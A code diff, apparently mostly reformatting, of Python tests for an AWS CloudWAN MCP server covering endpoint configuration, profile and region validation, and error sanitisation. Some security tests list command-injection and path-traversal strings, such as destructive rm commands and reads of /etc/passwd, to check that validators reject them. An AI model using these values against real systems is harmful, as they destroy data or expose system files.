                 print(f"      - {service}: {endpoint}")
     else:
         print(f"   ❌ Failed: {data.get('error')}")
-    
+
     # Test 6: Test profile switching behavior
     print("\n6. Testing profile switching with endpoint resolution...")
-    
+
     # Switch to production profile
     result = await aws_config_manager("set_profile", profile="taylaand+net-prod-Admin")
     data = json.loads(result)
     if data.get("success"):
         print(f"   ✅ Switched to production profile")
         print(f"   → This profile will use custom VPC endpoints")
-    
+
     # Switch to a profile without custom endpoints
     result = await aws_config_manager("set_profile", profile="default")
     data = json.loads(result)
     if data.get("success"):
         print(f"   ✅ Switched to default profile")
         print(f"   → This profile will use standard AWS endpoints")
-    
+
     # Test 7: Clear endpoints for development profile
     print("\n7. Clearing endpoints for development profile...")
-    result = await aws_config_manager(
-        "clear_profile_endpoints",
-        profile="development-profile"
-    )
+    result = await aws_config_manager("clear_profile_endpoints", profile="development-profile")
     data = json.loads(result)
     if data.get("success"):
         print(f"   ✅ Endpoints cleared: {data.get('endpoints_cleared')}")
         print(f"   → development-profile will now use standard endpoints")
     else:
         print(f"   ❌ Failed: {data.get('error')}")
-    
+
     # Test 8: Verify final state
     print("\n8. Final verification...")
     result = await aws_config_manager("list_profile_endpoints")
     data = json.loads(result)
     print(f"   Final profile endpoint count: {data.get('total_profiles', 0)}")
-    
+
     print("\n" + "=" * 60)
     print("✨ Dynamic Endpoint Management Test Complete!")
     print("\nKey Benefits Demonstrated:")
     print("• ✅ Profile-specific endpoint configuration")
-    print("• ✅ Dynamic switching without server restart") 
+    print("• ✅ Dynamic switching without server restart")
     print("• ✅ Support for AWS profiles with special characters")
     print("• ✅ Automatic cache clearing for immediate effect")
     print("• ✅ Fallback to standard endpoints when not configured")
-    
+
     print("\n💡 Usage Example:")
     print("   # Set VPC endpoints for production")
-    print('   aws_config_manager("set_profile_endpoints", profile="prod", region=\'{"networkmanager": "https://vpce-123.amazonaws.com"}\')') 
+    print(
+        '   aws_config_manager("set_profile_endpoints", profile="prod", region=\'{"networkmanager": "https://vpce-123.amazonaws.com"}\')'
+    )
     print("   # Switch to production profile")
     print('   aws_config_manager("set_profile", profile="prod")')
     print("   # Now all CloudWAN calls use VPC endpoints automatically!")
 
+
 if __name__ == "__main__":
-    asyncio.run(test_dynamic_endpoint_management())
\ No newline at end of file
+    asyncio.run(test_dynamic_endpoint_management())

--- test_q_developer.py
+++ test_q_developer.py
@@ -8,39 +8,43 @@
 import time
 from pathlib import Path
 
+
 async def test_q_developer_connection():
     """Test that Q Developer can connect to the CloudWAN MCP server."""
-    
+
     print("🔍 Testing Q Developer CLI Connection to CloudWAN MCP Server")
     print("=" * 60)
-    
+
     # Set environment variables as Q Developer would
     env = os.environ.copy()
-    env.update({
-        "AWS_PROFILE": "taylaand+customer-cloudwan-Admin",
-        "AWS_DEFAULT_REGION": "us-west-2",
-        "CLOUDWAN_AWS_CUSTOM_ENDPOINTS": '{"networkmanager": "https://networkmanageromega.us-west-2.amazonaws.com"}',
-        "AWS_ENDPOINT_URL_NETWORKMANAGER": "https://networkmanageromega.us-west-2.amazonaws.com",
-        "CLOUDWAN_MCP_DEBUG": "true",
-        "CLOUDWAN_MCP_LOG_LEVEL": "DEBUG"
-    })
-    
+    env.update(
+        {
+            "AWS_PROFILE": "taylaand+customer-cloudwan-Admin",
+            "AWS_DEFAULT_REGION": "us-west-2",
+            "CLOUDWAN_AWS_CUSTOM_ENDPOINTS": '{"networkmanager": "https://networkmanageromega.us-west-2.amazonaws.com"}',
+            "AWS_ENDPOINT_URL_NETWORKMANAGER": "https://networkmanageromega.us-west-2.amazonaws.com",
+            "CLOUDWAN_MCP_DEBUG": "true",
+            "CLOUDWAN_MCP_LOG_LEVEL": "DEBUG",
+        }
+    )
+
     print("📋 Environment variables set:")
     for key, value in env.items():
-        if key.startswith(('AWS_', 'CLOUDWAN_')):
+        if key.startswith(("AWS_", "CLOUDWAN_")):
             print(f"   {key}={value}")
-    
+
     print()
-    
+
     # Test 1: Server startup
     print("🚀 Test 1: Server startup test")
     cmd = [
-        "uvx", 
-        "--from", "/Users/taylaand/code/mcp/cloud-wan-mcp-server/mcp/src/cloudwan-mcp-server",
+        "uvx",
+        "--from",
+        "/Users/taylaand/code/mcp/cloud-wan-mcp-server/mcp/src/cloudwan-mcp-server",
         "cloudwan-mcp-server",
-        "--help"
+        "--help",
     ]
-    
+
     try:
         result = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=10)
         if result.returncode == 0:
@@ -56,31 +60,32 @@
     except Exception as e:
         print(f"   ❌ Server startup failed: {str(e)}")
         return False
-    
+
     print()
-    
+
     # Test 2: MCP Protocol availability
     print("🔌 Test 2: MCP Protocol availability test")
-    
+
     # Start the server as a background process for a brief moment to see if MCP initializes
     cmd = [
-        "uvx", 
-        "--from", "/Users/taylaand/code/mcp/cloud-wan-mcp-server/mcp/src/cloudwan-mcp-server",
-        "cloudwan-mcp-server"
+        "uvx",
+        "--from",
+        "/Users/taylaand/code/mcp/cloud-wan-mcp-server/mcp/src/cloudwan-mcp-server",
+        "cloudwan-mcp-server",
     ]
-    
+
     try:
         # Start the server process
         process = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
+
         # Give it a moment to initialize
         time.sleep(2)
-        
+
         # Check if process is still running (good sign)
         if process.poll() is None:
             print("   ✅ MCP server process is running")
             print("   📋 Server initialized without immediate crashes")
-            
+
             # Terminate the process cleanly
             process.terminate()
             try:
@@ -89,62 +94,62 @@
             except subprocess.TimeoutExpired:
                 process.kill()
                 print("   ⚠️  Server required force termination")
-                
+
         else:
             print(f"   ❌ Server exited immediately with code: {process.returncode}")
             stdout, stderr = process.communicate()
             if stderr:
                 print(f"   📝 stderr: {stderr}")
             return False
-            
+
     except Exception as e:
         print(f"   ❌ MCP protocol test failed: {str(e)}")
         return False
-    
+
     print()
-    
+
     # Test 3: Configuration validation
     print("📁 Test 3: Q Developer configuration validation")
-    
+
     config_path = Path.home() / ".aws/amazonq/mcp.json"
-    
+
     if not config_path.exists():
         print(f"   ❌ Q Developer config not found at {config_path}")
         return False
-    
+
     try:
-        with open(config_path, 'r') as f:
+        with open(config_path, "r") as f:
             config = json.load(f)
-        
+
         if "awslabs.cloudwan-mcp-server" in config.get("mcpServers", {}):
             cloudwan_config = config["mcpServers"]["awslabs.cloudwan-mcp-server"]
             print("   ✅ CloudWAN MCP server configuration found")
             print(f"   📋 Command: {cloudwan_config['command']}")
             print(f"   📋 Args: {' '.join(cloudwan_config['args'])}")
             print(f"   📋 Disabled: {cloudwan_config.get('disabled', False)}")
-            
+
             # Check for required environment variables
             required_env = cloudwan_config.get("env", {})
             if "AWS_PROFILE" in required_env and "AWS_DEFAULT_REGION" in required_env:
                 print("   ✅ Required AWS environment variables configured")
             else:
                 print("   ⚠️  Some AWS environment variables may be missing")
-                
+
         else:
             print("   ❌ CloudWAN MCP server not found in Q Developer configuration")
             return False
-            
+
     except Exception as e:
         print(f"   ❌ Config validation failed: {str(e)}")
         return False
-    
+
     print()
-    
+
     print("=" * 60)
     print("🎯 Q DEVELOPER CONNECTION TEST SUMMARY")
     print("=" * 60)
     print("✅ Server executable: cloudwan-mcp-server")
-    print("✅ Server startup: Working")  
+    print("✅ Server startup: Working")
     print("✅ MCP protocol: Initializes correctly")
     print("✅ Q Developer config: Valid")
     print("✅ AWS profile support: taylaand+customer-cloudwan-Admin")
@@ -156,13 +161,14 @@
     print("   1. Restart Q Developer CLI")
     print("   2. Check Q Developer logs for detailed error messages")
     print("   3. Verify AWS credentials are accessible from Q Developer's environment")
-    
+
     return True
 
+
 if __name__ == "__main__":
     success = asyncio.run(test_q_developer_connection())
     if success:
         print("\n🎉 ALL Q DEVELOPER CONNECTION TESTS PASSED!")
     else:
         print("\n⚠️  Some tests failed - Q Developer may have connection issues")
-    exit(0 if success else 1)
\ No newline at end of file
+    exit(0 if success else 1)

--- tests/integration/test_aws_integration.py
+++ tests/integration/test_aws_integration.py
@@ -240,10 +240,10 @@
                 assert mock_client.called
                 call_args = mock_client.call_args
                 assert call_args is not None
-                
+
                 # Check service name and region
                 assert call_args[0][0] == "networkmanager"
-                
+
                 # Check configuration parameters
                 if "config" in call_args[1]:
                     config = call_args[1]["config"]

--- tests/integration/test_security_compliance.py
+++ tests/integration/test_security_compliance.py
@@ -560,7 +560,6 @@
                         f"Potential credential exposure: {match[:8]}***"
                     )
 
-
     @pytest.mark.integration
     @pytest.mark.security
     @pytest.mark.asyncio

--- tests/test_aws_config_manager.py
+++ tests/test_aws_config_manager.py
@@ -19,10 +19,7 @@
 from unittest.mock import Mock, patch, MagicMock
 from pathlib import Path
 
-from awslabs.cloudwan_mcp_server.utils.aws_config_manager import (
-    get_aws_config,
-    get_aws_client
-)
+from awslabs.cloudwan_mcp_server.utils.aws_config_manager import get_aws_config, get_aws_client
 
 
 class TestAWSConfigManager:
@@ -33,201 +30,193 @@
         # Clear any existing singleton
         global _aws_config_instance
         _aws_config_instance = None
-        
+
     def test_singleton_pattern(self):
         """Test that AWSConfigManager follows singleton pattern."""
         config1 = get_aws_config()
         config2 = get_aws_config()
-        
+
         assert config1 is config2, "AWSConfigManager should be a singleton"
-        
+
     def test_default_initialization(self):
         """Test default configuration values."""
         config = AWSConfigManager()
-        
+
         assert config.default_region == "us-west-2"
         assert config.profile is None
         assert config.debug is False
-        
-    @patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'eu-west-1', 'AWS_PROFILE': 'test-profile'})
+
+    @patch.dict("os.environ", {"AWS_DEFAULT_REGION": "eu-west-1", "AWS_PROFILE": "test-profile"})
     def test_environment_variable_initialization(self):
         """Test initialization from environment variables."""
         config = AWSConfigManager()
-        
+
         assert config.default_region == "eu-west-1"
         assert config.profile == "test-profile"
-        
+
     def test_set_profile_validation(self):
         """Test profile validation."""
         config = AWSConfigManager()
-        
+
         # Valid profile names
         assert config.set_profile("dev") is True
         assert config.set_profile("production-profile") is True
         assert config.set_profile("test_123") is True
-        
+
         # Invalid profile names
         assert config.set_profile("") is False
         assert config.set_profile("profile with spaces") is False
         assert config.set_profile("profile@invalid") is False
-        
+
     def test_set_region_validation(self):
         """Test region validation."""
         config = AWSConfigManager()
-        
+
         # Valid regions
         assert config.set_region("us-east-1") is True
         assert config.set_region("eu-central-1") is True
         assert config.set_region("ap-southeast-2") is True
-        
+
         # Invalid regions
         assert config.set_region("") is False
         assert config.set_region("invalid-region") is False
         assert config.set_region("us-east") is False
-        
+
     def test_set_profile_updates_profile(self):
         """Test that set_profile actually updates the profile."""
         config = AWSConfigManager()
-        
+
         config.set_profile("new-profile")
         assert config.profile == "new-profile"
-        
+
     def test_set_region_updates_region(self):
         """Test that set_region actually updates the region."""
         config = AWSConfigManager()
-        
+
         config.set_region("us-east-1")
         assert config.default_region == "us-east-1"
-        
+
     def test_to_dict(self):
         """Test configuration serialization."""
         config = AWSConfigManager()
         config.set_profile("test-profile")
         config.set_region("us-east-1")
-        
+
         config_dict = config.to_dict()
-        
-        expected = {
-            "profile": "test-profile",
-            "default_region": "us-east-1",
-            "debug": False
-        }
-        
+
+        expected = {"profile": "test-profile", "default_region": "us-east-1", "debug": False}
+
         assert config_dict == expected
 
 
 class TestAWSConfigManagerTool:
     """Test cases for the aws_config_manager MCP tool."""
-    
+
     def setup_method(self):
         """Set up test environment."""
         # Reset singleton
         global _aws_config_instance
         _aws_config_instance = None
-        
+
     @pytest.mark.asyncio
     async def test_get_current_operation(self):
         """Test get_current operation."""
         result_str = await aws_config_manager("get_current")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert "current_profile" in result["data"]
         assert "current_region" in result["data"]
         assert "debug" in result["data"]
-        
+
     @pytest.mark.asyncio
     async def test_set_profile_operation(self):
         """Test set_profile operation."""
         result_str = await aws_config_manager("set_profile", profile="test-profile")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert result["data"]["profile_updated"] is True
-        
+
         # Verify the profile was actually set
         config = get_aws_config()
         assert config.profile == "test-profile"
-        
+
     @pytest.mark.asyncio
     async def test_set_profile_invalid(self):
         """Test set_profile operation with invalid profile."""
         result_str = await aws_config_manager("set_profile", profile="invalid profile")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "error"
         assert "invalid profile name" in result["error"].lower()
-        
+
     @pytest.mark.asyncio
     async def test_set_region_operation(self):
         """Test set_region operation."""
         result_str = await aws_config_manager("set_region", region="eu-west-1")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert result["data"]["region_updated"] is True
-        
+
         # Verify the region was actually set
         config = get_aws_config()
         assert config.default_region == "eu-west-1"
-        
+
     @pytest.mark.asyncio
     async def test_set_region_invalid(self):
         """Test set_region operation with invalid region."""
         result_str = await aws_config_manager("set_region", region="invalid-region")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "error"
         assert "invalid region format" in result["error"].lower()
-        
+
     @pytest.mark.asyncio
     async def test_set_both_operation(self):
         """Test set_both operation."""
-        result_str = await aws_config_manager(
-            "set_both", 
-            profile="production", 
-            region="us-east-1"
-        )
+        result_str = await aws_config_manager("set_both", profile="production", region="us-east-1")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert result["data"]["profile_updated"] is True
         assert result["data"]["region_updated"] is True
-        
+
         # Verify both were actually set
         config = get_aws_config()
         assert config.profile == "production"
         assert config.default_region == "us-east-1"
-        
+
     @pytest.mark.asyncio
     async def test_validate_config_operation(self):
         """Test validate_config operation."""
         result_str = await aws_config_manager("validate_config")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert "validation" in result["data"]
         assert "profile_valid" in result["data"]["validation"]
         assert "region_valid" in result["data"]["validation"]
-        
+
     @pytest.mark.asyncio
     async def test_clear_cache_operation(self):
         """Test clear_cache operation."""
         result_str = await aws_config_manager("clear_cache")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert "cache_cleared" in result["data"]
-        
+
     @pytest.mark.asyncio
     async def test_invalid_operation(self):
         """Test invalid operation."""
         result_str = await aws_config_manager("invalid_operation")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "error"
         assert "unsupported operation" in result["error"].lower()
-        
+
     @pytest.mark.asyncio
     async def test_missing_required_parameters(self):
         """Test operations with missing required parameters."""
@@ -235,68 +224,61 @@
         result_str = await aws_config_manager("set_profile")
         result = json.loads(result_str)
         assert result["status"] == "error"
-        
+
         # set_region without region parameter
         result_str = await aws_config_manager("set_region")
         result = json.loads(result_str)
         assert result["status"] == "error"
-        
+
     @pytest.mark.asyncio
     async def test_set_both_partial_failure(self):
         """Test set_both with one valid and one invalid parameter."""
-        result_str = await aws_config_manager(
-            "set_both", 
-            profile="valid-profile", 
-            region="invalid-region"
-        )
+        result_str = await aws_config_manager("set_both", profile="valid-profile", region="invalid-region")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"  # Partial success
         assert result["data"]["profile_updated"] is True
         assert result["data"]["region_updated"] is False
-        
+
     @pytest.mark.asyncio
     async def test_concurrent_access(self):
         """Test concurrent access to configuration manager."""
         import asyncio
-        
+
         async def set_profile_task(profile_name):
             return await aws_config_manager("set_profile", profile=profile_name)
-            
+
         # Run multiple profile updates concurrently
-        tasks = [
-            set_profile_task(f"profile-{i}")
-            for i in range(5)
-        ]
-        
+        tasks = [set_profile_task(f"profile-{i}") for i in range(5)]
+
         results = await asyncio.gather(*tasks)
-        
+
         # All operations should succeed
         for result_str in results:
             result = json.loads(result_str)
             assert result["status"] == "success"
-            
+
         # Final profile should be one of the set profiles
         config = get_aws_config()
         assert config.profile.startswith("profile-")
-        
+
     @pytest.mark.asyncio
-    @patch('awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client')
+    @patch("awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client")
     async def test_cache_integration(self, mock_get_client):
         """Test integration with AWS client cache."""
         mock_client = Mock()
         mock_get_client.return_value = mock_client
-        
+
         # Set initial configuration
         await aws_config_manager("set_profile", profile="test-profile")
         await aws_config_manager("set_region", region="us-east-1")
-        
+
         # Clear cache should work without errors
         result_str = await aws_config_manager("clear_cache")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
-        
+
     @pytest.mark.asyncio
     async def test_config_history_tracking(self):
         """Test that configuration changes are tracked."""
@@ -304,31 +286,31 @@
         await aws_config_manager("set_profile", profile="profile-1")
         await aws_config_manager("set_region", region="us-east-1")
         await aws_config_manager("set_profile", profile="profile-2")
-        
+
         # Get configuration history
         result_str = await aws_config_manager("get_config_history")
         result = json.loads(result_str)
-        
+
         assert result["status"] == "success"
         assert "history" in result["data"]
-        
+
     @pytest.mark.asyncio
     async def test_error_handling_exception(self):
         """Test proper error handling when exceptions occur."""
         # Mock an internal error
-        with patch('awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_config') as mock_get_config:
+        with patch("awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_config") as mock_get_config:
             mock_get_config.side_effect = Exception("Internal error")
-            
+
             result_str = await aws_config_manager("get_current")
             result = json.loads(result_str)
-            
+
             assert result["status"] == "error"
             assert "failed to execute" in result["error"].lower()
-            
+
     def test_profile_name_security(self):
         """Test that profile names are properly validated for security."""
         config = AWSConfigManager()
-        
+
         # Test injection attempts
         malicious_profiles = [
             "profile; rm -rf /",
@@ -338,24 +320,26 @@
             "profile$(id)",
             "../../../etc/passwd",
             "NUL",
-            "CON"
+            "CON",
         ]
-        
+
         for malicious_profile in malicious_profiles:
-            assert config.set_profile(malicious_profile) is False, f"Should reject malicious profile: {malicious_profile}"
-            
+            assert config.set_profile(malicious_profile) is False, (
+                f"Should reject malicious profile: {malicious_profile}"
+            )
+
     def test_region_name_security(self):
         """Test that region names are properly validated for security."""
         config = AWSConfigManager()
-        
+
         # Test injection attempts
         malicious_regions = [
             "us-east-1; rm -rf /",
-            "us-east-1 && echo vulnerable", 
+            "us-east-1 && echo vulnerable",
             "us-east-1 | cat /etc/passwd",
             "../../../etc/passwd",
-            "us-east-1`whoami`"
+            "us-east-1`whoami`",
         ]
-        
+
         for malicious_region in malicious_regions:
-            assert config.set_region(malicious_region) is False, f"Should reject malicious region: {malicious_region}"
\ No newline at end of file
+            assert config.set_region(malicious_region) is False, f"Should reject malicious region: {malicious_region}"

--- tests/test_server.py
+++ tests/test_server.py
@@ -28,73 +28,60 @@
 
 class TestErrorHandling:
     """Test error handling utilities."""
-    
+
     def test_sanitize_error_message(self):
         """Test sanitization of sensitive data."""
         # Test IP address sanitization
         assert sanitize_error_message("Error at 192.168.1.1") == "Error at [IP_REDACTED]"
-        
+
         # Test AWS ARN sanitization
         arn = "arn:aws:s3:::123456789012:bucket/key"
         assert "[ARN_REDACTED]" in sanitize_error_message(arn)
-        
+
         # Test access key sanitization
         assert sanitize_error_message("AccessKey=AKIAIOSFODNN7EXAMPLE") == "[ACCESS_KEY_REDACTED]"
-    
+
     def test_get_error_status_code(self):
         """Test HTTP status code mapping."""
         from botocore.exceptions import ClientError
-        
+
         # Test access denied
-        error = ClientError(
-            {"Error": {"Code": "AccessDenied"}},
-            "TestOperation"
-        )
+        error = ClientError({"Error": {"Code": "AccessDenied"}}, "TestOperation")
         assert get_error_status_code(error) == 403
-        
+
         # Test validation error
-        error = ClientError(
-            {"Error": {"Code": "ValidationException"}},
-            "TestOperation"
-        )
+        error = ClientError({"Error": {"Code": "ValidationException"}}, "TestOperation")
         assert get_error_status_code(error) == 400
-        
+
         # Test ValueError
         assert get_error_status_code(ValueError("test")) == 400
-        
+
         # Test generic exception
         assert get_error_status_code(Exception("test")) == 500
-    
+
     def test_handle_aws_error(self):
         """Test AWS error handling."""
         from botocore.exceptions import ClientError
-        
-        error = ClientError(
-            {"Error": {"Code": "AccessDenied", "Message": "Access denied"}},
-            "TestOperation"
-        )
-        
+
+        error = ClientError({"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, "TestOperation")
+
         result = handle_aws_error(error, "test_operation")
         parsed = json.loads(result)
-        
+
         assert parsed["success"] is False
         assert "test_operation failed" in parsed["error"]
         assert parsed["error_code"] == "AccessDenied"
         assert parsed["http_status_code"] == 403
-    
+
     def test_safe_json_dumps(self):
         """Test safe JSON serialization."""
         from datetime import datetime
-        
-        data = {
-            "timestamp": datetime(2025, 1, 1, 0, 0, 0),
-            "string": "test",
-            "number": 42
-        }
-        
+
+        data = {"timestamp": datetime(2025, 1, 1, 0, 0, 0), "string": "test", "number": 42}
+
         result = safe_json_dumps(data)
         parsed = json.loads(result)
-        
+
         assert parsed["timestamp"] == "2025-01-01T00:00:00"
         assert parsed["string"] == "test"
         assert parsed["number"] == 42
@@ -102,11 +89,11 @@
 
 class TestServerInitialization:
     """Test server initialization."""
-    
+
     @patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"})
     def test_aws_config_initialization(self):
         """Test AWS config initialization."""
         from awslabs.cloudwan_mcp_server.server import aws_config
-        
+
         assert aws_config.default_region == "us-east-1"
-        assert aws_config.profile is None or isinstance(aws_config.profile, str)
\ No newline at end of file
+        assert aws_config.profile is None or isinstance(aws_config.profile, str)

--- tests/unit/test_aws_config_manager.py
+++ tests/unit/test_aws_config_manager.py
@@ -31,6 +31,8 @@
     env["AWS_PROFILE"] = profile if profile else "default"
     env["AWS_DEFAULT_REGION"] = region if region else "us-east-1"
     return env
+
+
 class TestAWSConfigManager:
     """Test cases for AWS configuration manager."""
 

--- tests/unit/test_discover_ip_details_enhanced.py
+++ tests/unit/test_discover_ip_details_enhanced.py
@@ -34,62 +34,70 @@
         # Mock AWS client
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # Step 1: ENI discovery
             ec2.describe_network_interfaces.return_value = {
-                "NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-123",
-                    "SubnetId": "subnet-abc",
-                    "VpcId": "vpc-xyz",
-                    "AvailabilityZone": "us-east-1a",
-                    "Groups": [{"GroupId": "sg-111"}],
-                    "Status": "in-use",
-                    "InterfaceType": "interface",
-                    "Attachment": {"InstanceId": "i-12345", "Status": "attached"}
-                }]
+                "NetworkInterfaces": [
+                    {
+                        "NetworkInterfaceId": "eni-123",
+                        "SubnetId": "subnet-abc",
+                        "VpcId": "vpc-xyz",
+                        "AvailabilityZone": "us-east-1a",
+                        "Groups": [{"GroupId": "sg-111"}],
+                        "Status": "in-use",
+                        "InterfaceType": "interface",
+                        "Attachment": {"InstanceId": "i-12345", "Status": "attached"},
+                    }
+                ]
             }
-            
+
             # Step 2: Route Tables
             ec2.describe_route_tables.return_value = {
-                "RouteTables": [{
-                    "RouteTableId": "rtb-123", 
-                    "Routes": [
-                        {"DestinationCidrBlock": "0.0.0.0/0", "GatewayId": "igw-123"},
-                        {"DestinationCidrBlock": "10.0.0.0/16", "GatewayId": "local"}
-                    ],
-                    "Associations": [{"SubnetId": "subnet-abc"}],
-                    "PropagatingVgws": []
-                }]
+                "RouteTables": [
+                    {
+                        "RouteTableId": "rtb-123",
+                        "Routes": [
+                            {"DestinationCidrBlock": "0.0.0.0/0", "GatewayId": "igw-123"},
+                            {"DestinationCidrBlock": "10.0.0.0/16", "GatewayId": "local"},
+                        ],
+                        "Associations": [{"SubnetId": "subnet-abc"}],
+                        "PropagatingVgws": [],
+                    }
+                ]
             }
-            
+
             # Step 3: Security Groups
             ec2.describe_security_groups.return_value = {
-                "SecurityGroups": [{
-                    "GroupId": "sg-111",
-                    "GroupName": "default",
-                    "Description": "default security group",
-                    "IpPermissions": [
-                        {"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}
-                    ],
-                    "IpPermissionsEgress": [
-                        {"IpProtocol": "-1", "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}
-                    ],
-                    "VpcId": "vpc-xyz"
-                }]
+                "SecurityGroups": [
+                    {
+                        "GroupId": "sg-111",
+                        "GroupName": "default",
+                        "Description": "default security group",
+                        "IpPermissions": [
+                            {"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}
+                        ],
+                        "IpPermissionsEgress": [{"IpProtocol": "-1", "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}],
+                        "VpcId": "vpc-xyz",
+                    }
+                ]
             }
-            
+
             # Step 4: Instance association
             ec2.describe_instances.return_value = {
-                "Reservations": [{
-                    "Instances": [{
-                        "InstanceId": "i-12345",
-                        "InstanceType": "t3.micro",
-                        "State": {"Name": "running"},
-                        "Platform": "linux",
-                        "LaunchTime": datetime.now(),
-                        "Tags": [{"Key": "Name", "Value": "test-instance"}]
-                    }]
-                }]
+                "Reservations": [
+                    {
+                        "Instances": [
+                            {
+                                "InstanceId": "i-12345",
+                                "InstanceType": "t3.micro",
+                                "State": {"Name": "running"},
+                                "Platform": "linux",
+                                "LaunchTime": datetime.now(),
+                                "Tags": [{"Key": "Name", "Value": "test-instance"}],
+                            }
+                        ]
+                    }
+                ]
             }
 
             mock_client.return_value = ec2
@@ -100,29 +108,29 @@
             assert response["success"] is True
             assert response["ip_address"] == fake_ip
             assert response["is_private"] is True
-            
+
             # Validate ENI details
             eni_details = response["aws_networking_context"]["eni_details"]
             assert eni_details["eni_found"] is True
             assert eni_details["eni_id"] == "eni-123"
             assert eni_details["vpc_id"] == "vpc-xyz"
-            
+
             # Validate routing context
             routing_context = response["aws_networking_context"]["routing_context"]
             assert routing_context["route_table_found"] is True
             assert routing_context["route_table_id"] == "rtb-123"
             assert len(routing_context["routes"]) == 2
-            
+
             # Validate security groups
             sg_context = response["aws_networking_context"]["security_groups"]
             assert sg_context["security_groups_found"] is True
             assert len(sg_context["security_groups"]) == 1
-            
+
             # Validate associated resources
             resources = response["aws_networking_context"]["associated_resources"]
             assert resources["resources_found"] is True
             assert resources["instance_id"] == "i-12345"
-            
+
             # Validate metrics
             assert response["services_queried"] == 4
             assert response["services_successful"] == 4
@@ -137,7 +145,7 @@
 
             result = await discover_ip_details("192.168.1.100")
             response = json.loads(result)
-            
+
             assert response["success"] is True
             assert response["aws_networking_context"]["eni_details"]["eni_found"] is False
             assert "No AWS network interface found" in response["aws_networking_context"]["message"]
@@ -148,49 +156,47 @@
         """Test graceful degradation when some services fail."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # ENI found successfully
             ec2.describe_network_interfaces.return_value = {
-                "NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-123",
-                    "SubnetId": "subnet-abc",
-                    "Groups": [{"GroupId": "sg-111"}],
-                    "Attachment": {"InstanceId": "i-12345"}
-                }]
+                "NetworkInterfaces": [
+                    {
+                        "NetworkInterfaceId": "eni-123",
+                        "SubnetId": "subnet-abc",
+                        "Groups": [{"GroupId": "sg-111"}],
+                        "Attachment": {"InstanceId": "i-12345"},
+                    }
+                ]
             }
-            
+
             # Route table discovery fails
             ec2.describe_route_tables.side_effect = Exception("Route table service unavailable")
-            
+
             # Security groups succeed
             ec2.describe_security_groups.return_value = {
-                "SecurityGroups": [{
-                    "GroupId": "sg-111",
-                    "GroupName": "web-sg"
-                }]
+                "SecurityGroups": [{"GroupId": "sg-111", "GroupName": "web-sg"}]
             }
-            
+
             # Instance discovery fails
             ec2.describe_instances.side_effect = ClientError(
-                {"Error": {"Code": "UnauthorizedOperation", "Message": "Not authorized"}}, 
-                "DescribeInstances"
+                {"Error": {"Code": "UnauthorizedOperation", "Message": "Not authorized"}}, "DescribeInstances"
             )
-            
+
             mock_client.return_value = ec2
             result = await discover_ip_details("10.0.0.10")
             response = json.loads(result)
 
             # Should still succeed overall
             assert response["success"] is True
-            
+
             # ENI and SG should succeed
             assert response["aws_networking_context"]["eni_details"]["eni_found"] is True
             assert response["aws_networking_context"]["security_groups"]["security_groups_found"] is True
-            
+
             # Route table and resources should fail gracefully
             assert response["aws_networking_context"]["routing_context"]["route_table_found"] is False
             assert response["aws_networking_context"]["associated_resources"]["resources_found"] is False
-            
+
             # Metrics should reflect partial success
             assert response["services_successful"] == 2  # ENI + SG successful
 
@@ -198,12 +204,12 @@
         """Test that sensitive information is properly sanitized in errors."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # ENI discovery contains sensitive error
             ec2.describe_network_interfaces.side_effect = Exception(
                 "Access denied for arn:aws:iam::123456789012:user/sensitive-user with AKIA1234567890123456"
             )
-            
+
             mock_client.return_value = ec2
             result = await discover_ip_details("10.0.0.1")
             response = json.loads(result)
@@ -219,7 +225,7 @@
         """Test handling of invalid IP address format."""
         result = await discover_ip_details("invalid-ip-address")
         response = json.loads(result)
-        
+
         assert response["success"] is False
         assert "error" in response
         assert "discover_ip_details failed" in response["error"]
@@ -228,18 +234,22 @@
         """Test discovery for public IP addresses (Elastic IPs)."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # Private IP search returns empty, public IP search succeeds
             ec2.describe_network_interfaces.side_effect = [
                 {"NetworkInterfaces": []},  # First call (private IP)
-                {"NetworkInterfaces": [{    # Second call (public IP)
-                    "NetworkInterfaceId": "eni-public-123",
-                    "SubnetId": "subnet-public",
-                    "Groups": [{"GroupId": "sg-web"}],
-                    "Association": {"PublicIp": "54.123.45.67"}
-                }]}
+                {
+                    "NetworkInterfaces": [
+                        {  # Second call (public IP)
+                            "NetworkInterfaceId": "eni-public-123",
+                            "SubnetId": "subnet-public",
+                            "Groups": [{"GroupId": "sg-web"}],
+                            "Association": {"PublicIp": "54.123.45.67"},
+                        }
+                    ]
+                },
             ]
-            
+
             mock_client.return_value = ec2
             result = await discover_ip_details("54.123.45.67")
